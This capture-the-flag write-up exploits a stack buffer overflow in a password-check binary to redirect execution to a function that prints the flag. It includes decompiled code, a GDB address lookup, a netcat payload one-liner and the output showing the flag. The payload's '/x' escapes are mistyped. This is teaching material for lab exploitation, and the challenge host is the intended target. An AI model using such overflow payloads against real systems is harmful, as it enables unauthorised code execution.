# PlebPwn

### Challenge
> Please pwn my plebian password program!
> Please connect to 128.199.98.78:1700 

### Solution
Firstly, I'll use Hopper to decompile the binary file. We see `print_me` and `check_password` functions which are related to what we want.

	int check_password() {
	    asm { rep stosd  dword [edi], eax };
	    printf("Please enter the password: ");
	    read(0x0, &var_4C, 0x80);
	    esp = ((esp - 0x10) + 0x10 - 0x10) + 0x10;
	    if ((var_4C & 0xff) != 0x0) {
	            eax = strcmp("great_password_friend", &var_4C);
	            eax = (eax == 0x0 ? 0x1 : 0x0) & 0xff;
	    }
	    else {
	            eax = 0x0;
	    }
	    return eax;
	}

	void print_me() {
	    system("/bin/cat /flag");
	    return;
	}

I tried `great_password_friend`, but it wasn't the flag. `:(` Let's continue...
Immediately, we can see that check_password can be attacked using buffer overflow.
Use GDB to find the address of the `print_me` function.

	(gdb) break print_me
	Breakpoint 1 at 0x8048551

Rearranging the address for little endian stack, we get this:

	python -c "print 'A'*80 + '/x4b/x85/x04/x08'" | nc 128.199.98.78 1700 

I am not sure of the buffer length, so I'll bruteforce it from 1 to an arbitrary number, 140.
(See [bruteforce-buffer-overflow.sh](bruteforce-buffer-overflow.sh))

Originally, I was filling the buffer with 'A's but the program seems to be crashing (not showing `Incorrect!` after certain lengths).
Long story short, we have to replace it with null characters `\x00` to prevent the memory addresses from being invalid as 0x41414141

	Please enter the password: Doing 79
	Please enter the password: Doing 80
	Please enter the password: CrossCTF{av01d_th0s3_cr4sh3s}
	Doing 81
	Please enter the password: Doing 82

Around the 80th iteration, the flag is printed: `CrossCTF{av01d_th0s3_cr4sh3s}`